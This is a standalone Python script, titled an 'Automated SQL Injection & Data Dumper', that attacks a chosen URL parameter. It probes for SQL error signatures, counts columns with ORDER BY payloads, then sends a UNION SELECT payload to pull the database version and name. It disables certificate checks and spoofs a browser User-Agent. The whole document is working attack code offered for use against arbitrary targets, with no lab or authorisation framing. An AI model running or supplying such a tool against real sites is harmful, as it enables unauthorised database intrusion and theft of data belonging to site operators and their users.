import requests
import argparse
import urllib3
import urllib.parse
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def create_session():
    session = requests.Session()
    retries = Retry(total=3, backoff_factor=1, status_forcelist=[500, 502, 503, 504])
    session.mount('http://', HTTPAdapter(max_retries=retries))
    session.mount('https://', HTTPAdapter(max_retries=retries))
    return session

def test_sql_injection(target_url, param_name):
    print("=" * 60)
    print(f"[*] SQL INJECTION & DATA DUMPER: {target_url}")
    print(f"[*] Target Parameter: '{param_name}'")
    print("=" * 60)
    
    parsed = urllib.parse.urlparse(target_url)
    query_params = urllib.parse.parse_qs(parsed.query)
    
    if param_name not in query_params:
        print(f"[-] Error: Parameter '{param_name}' not found in query string.")
        return

    session = create_session()
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
    
    # 1. Error-Based / Boolean Sanity Check
    print("[*] Phase 1: Testing for SQL Error signatures...")
    orig_val = query_params[param_name][0]
    error_payload = orig_val + "'"
    
    test_params = query_params.copy()
    test_params[param_name] = [error_payload]
    test_query = urllib.parse.urlencode(test_params, doseq=True)
    test_url = urllib.parse.urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, test_query, parsed.fragment))
    
    try:
        resp = session.get(test_url, timeout=10, verify=False, headers=headers)
        sql_errors = [
            "sql syntax", "mysql_fetch", "syntax error", "unclosed quotation mark", 
            "unterminated string", "pg_query", "sqlite3.OperationalError", "ODBC SQL Server Driver"
        ]
        
        found_error = False
        for err in sql_errors:
            if err in resp.text.lower():
                print(f"    \033[91m[!] VULNERABLE: SQL Error signature detected ('{err}')\033[0m")
                found_error = True
                break
                
        if not found_error:
            print("    [-] No direct SQL error signature triggered. Trying advanced detection...")
    except requests.exceptions.RequestException as e:
        print(f"    [-] Target connection timed out or refused: {e}")
        print("    [!] Tip: The target server may be temporarily offline or blocking requests.")
        return

    # 2. Union-Based Column Enumeration & Extraction
    print("\n[*] Phase 2: Enumerating columns via UNION injection...")
    col_count = 0
    for i in range(1, 15):
        order_payload = f"{orig_val} ORDER BY {i}-- -"
        test_params[param_name] = [order_payload]
        test_query = urllib.parse.urlencode(test_params, doseq=True)
        test_url = urllib.parse.urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, test_query, parsed.fragment))
        
        try:
            resp = session.get(test_url, timeout=5, verify=False, headers=headers)
            if resp.status_code == 500 or "unknown column" in resp.text.lower() or "order by" in resp.text.lower():
                col_count = i - 1
                break
        except Exception:
            pass
            
    if col_count > 0:
        print(f"    [+] Inferred Column Count: {col_count}")
        print("\n[*] Phase 3: Extracting Database Environment...")
        nulls = ["NULL"] * col_count
        nulls[0] = "version()"
        if col_count > 1:
            nulls[1] = "database()"
            
        union_payload = f"{orig_val} UNION SELECT " + ",".join(nulls) + "-- -"
        test_params[param_name] = [union_payload]
        test_query = urllib.parse.urlencode(test_params, doseq=True)
        test_url = urllib.parse.urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, test_query, parsed.fragment))
        
        try:
            resp = session.get(test_url, timeout=10, verify=False, headers=headers)
            print(f"    [+] Extraction URL: {test_url}")
            print(f"    [+] Response Status: {resp.status_code}")
            if resp.status_code == 200:
                print("    \033[92m[+] Injection successful! Check response body or output for dumped data.\033[0m")
        except Exception as e:
            print(f"    [-] Extraction request failed: {e}")
    else:
        print("    [-] Could not determine column count via ORDER BY.")

    print("=" * 60)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Automated SQL Injection & Data Dumper")
    parser.add_argument("url", help="Target URL containing parameters")
    parser.add_argument("-p", "--param", default="cat", help="Vulnerable parameter name to test")
    
    args = parser.parse_args()
    test_sql_injection(args.url, args.param)
